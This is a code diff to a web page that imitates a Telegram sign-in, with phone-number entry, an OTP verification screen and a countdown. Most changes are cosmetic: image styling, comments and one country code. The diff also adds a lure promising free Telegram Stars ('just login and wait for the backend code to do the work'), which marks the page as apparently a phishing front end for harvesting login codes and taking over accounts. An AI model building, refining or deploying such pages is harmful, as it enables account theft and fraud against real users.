@@ -92,11 +92,14 @@
     box-shadow: var(--shadow-md);
     border: 1px solid var(--border);
   }
+  .popup-icon {
+    margin-bottom: 16px;
+  }
   .popup-icon img {
     width: 80px;
     height: 80px;
-    margin-bottom: 16px;
-    border-radius: 40px;
+    display: block;
+    margin: 0 auto;
   }
   .popup-title {
     font-size: 24px;
@@ -126,24 +129,29 @@
   }
   .popup-btn:hover { background: var(--accent-dark); }
 
-  /* ---------- LOGIN SCREEN WITH COUNTRY SELECTOR ---------- */
+  /* ---------- LOGIN SCREEN WITH pop.gif (NO RADIUS) ---------- */
   .login-header {
     text-align: center;
     padding: 32px 24px 16px;
   }
-  .logo-ring {
-    width: 64px;
-    height: 64px;
-    margin: 0 auto 18px;
-    background: var(--accent-light);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 32px;
-    color: var(--accent);
-    box-shadow: 0 2px 12px rgba(42, 141, 255, 0.2);
-  }
+  /* show GIF exactly as-is, no circle, no glow, no crop */
+.logo-ring{
+  width:80px;
+  height:80px;
+  margin:0 auto 18px;
+  overflow: visible;     /* do not crop */
+  border-radius: 0;      /* no rounding */
+  box-shadow: none;      /* remove glow */
+  background: transparent;
+}
+.logo-ring img{
+  width:auto;            /* keep original ratio */
+  height:80px;
+  display:block;
+  margin:0 auto;
+  object-fit: none;      /* don’t “contain” resize */
+  image-rendering: auto;
+}
   .login-header h2 {
     font-size: 26px;
     font-weight: 700;
@@ -313,7 +321,7 @@
   }
   .login-footer strong { color: var(--accent); }
 
-  /* ---------- VERIFICATION SCREEN WITH otp.gif ---------- */
+  /* ---------- VERIFICATION SCREEN WITH otp.gif (NO RADIUS) ---------- */
   .verify-screen {
     background: white;
     border-radius: 32px;
@@ -335,10 +343,15 @@
   .back-arrow:hover { color: var(--accent); }
 
   .verify-header { text-align: center; margin-bottom: 24px; }
+  .verify-header .icon {
+    margin-bottom: 8px;
+  }
   .verify-header .icon img {
     width: 60px;
     height: 60px;
-    margin-bottom: 8px;
+    display: block;
+    margin: 0 auto;
+    /* No border radius - keeps GIF original shape */
   }
   .verify-header h3 {
     font-size: 28px;
@@ -487,17 +500,19 @@
       <img src="sticker.webp" alt="spyx" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2280%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23EAF4FF%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%232A8DFF%22>⭐</text></svg>'">
     </div>
     <div class="popup-title">New method</div>
-    <div class="popup-text"><strong>spyx</strong> here — fresh, fast star earning.<br>Ready to move on?</div>
+    <div class="popup-text"><strong>dp hacks cracker</strong> new method to get telegram stars just login and wait for the backend code to do the work<br>Ready to move on?</div>
     <button class="popup-btn" onclick="closePopup()">Move on</button>
   </div>
 </div>
 
 <div id="app">
-  <!-- SCREEN 1: LOGIN WITH COUNTRY SELECTOR -->
+  <!-- SCREEN 1: LOGIN WITH pop.gif (NO RADIUS) -->
   <div class="screen show" id="loginScreen">
     <div class="card">
       <div class="login-header">
-        <div class="logo-ring">⭐</div>
+        <div class="logo-ring">
+          <img src="pop.gif" alt="POP" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2280%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23EAF4FF%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%232A8DFF%22>✨</text></svg>'">
+        </div>
         <h2>Telegram</h2>
         <div class="step-badge">step 1 · sign in</div>
       </div>
@@ -530,7 +545,7 @@
     </div>
   </div>
 
-  <!-- SCREEN 2: VERIFICATION WITH otp.gif -->
+  <!-- SCREEN 2: VERIFICATION WITH otp.gif (NO RADIUS) -->
   <div class="screen" id="verifyScreen">
     <div class="verify-screen">
       <button class="back-arrow" onclick="show('loginScreen')">← Back</button>
@@ -658,7 +673,7 @@ const countries = [
   { name: "Australia", code: "+61" },
   { name: "Austria", code: "+43" },
   { name: "Azerbaijan", code: "+994" },
-  { name: "Bahamas", code: "+1" },
+  { name: "Bahamas", code: "+1242" },
   { name: "Bahrain", code: "+973" },
   { name: "Bangladesh", code: "+880" },
   { name: "Barbados", code: "+1" },
@@ -887,7 +902,7 @@ function closePopup() {
   document.getElementById('welcomePopup').style.display = 'none';
 }
 
-// ---------- REST OF YOUR EXISTING JAVASCRIPT (keep all your original functions) ----------
+// ---------- REST OF YOUR EXISTING JAVASCRIPT ----------
 let countTimer = null, countSec = 10, resendTmr = null;
 const CIRC = 2 * Math.PI * 75;
 
@@ -1027,6 +1042,6 @@ document.getElementById('newPhoneInp')?.addEventListener('keydown', e=>{ if(e.ke
 
 api('/api/status').then(d => { if(d.loggedIn && d.user) { fillUser(d.user); show('countdownScreen'); startCountdown(); } }).catch(()=>{});
 </script>
-<!-- Save countries data to numbers.tsx (this comment indicates the data is available for export) -->
+<!-- Save countries data to numbers.tsx -->
 </body>
 </html>
